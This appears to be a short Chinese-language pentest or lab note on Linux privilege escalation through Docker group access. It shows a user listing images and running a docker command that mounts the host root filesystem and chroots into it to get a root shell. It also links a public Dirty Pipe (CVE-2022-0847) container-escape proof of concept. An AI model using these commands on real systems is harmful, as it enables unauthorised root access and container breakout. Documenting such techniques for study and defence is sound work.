### 权限提升

漏洞实例：

```bash
root      1133  0.0  8.3 507960 41516 ?        Ssl  09:08   0:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
```

验证用户具备Docker命令操作权限

```bash
alfred@break:~$ docker ps -a
docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
alfred@break:~$ docker images
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              775349758637        23 months ago       64.2MB
alpine              latest              965ea09ff2eb        23 months ago       5.55MB
centos              latest              0f3e07c0138f        24 months ago       220MB
alfred@break:~$
```

Run：

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Dirty Pipe Container Escape

to https://dirtypipe.cm4all.com/ , Dirty Pipe vulnerability (CVE-2022-0847)

https://github.com/datadog/dirtypipe-container-breakout-poc



